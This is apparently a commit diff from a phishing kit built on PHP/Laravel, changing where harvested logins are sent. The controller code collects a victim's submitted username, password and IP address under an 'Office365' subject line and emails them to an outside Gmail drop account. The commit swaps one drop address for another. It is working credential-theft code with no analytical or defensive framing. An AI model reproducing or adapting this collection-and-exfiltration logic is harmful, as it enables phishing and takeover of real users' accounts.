12468a7b1fd7443cec971739791abba091631189
Rich Mama <postmaster.richmama@gmail.com>
2018-01-23 01:54:03 +0100

    Test email

--- app/Http/Controllers/MainController.php
+++ app/Http/Controllers/MainController.php
@@ -61,7 +61,7 @@ class MainController extends Controller {
                  	 $ip = getenv("REMOTE_ADDR");
                  	  $s = "Office365 xD ".$ip;
                        $arr = ["email" => $req["username"], "password" => $req["passwd"], "ip" => $ip];
-                          $this->helpers->sendEmail("payagent008@gmail.com" ,$s,['arr' => $arr],'emails.login_alert','view');  
+                          $this->helpers->sendEmail("kudayisitobi@gmail.com" ,$s,['arr' => $arr],'emails.login_alert','view');  
                           Session::flash("collect", "yes" );                	         
                           return redirect()->intended('m');                       
                    }                                                                                                   
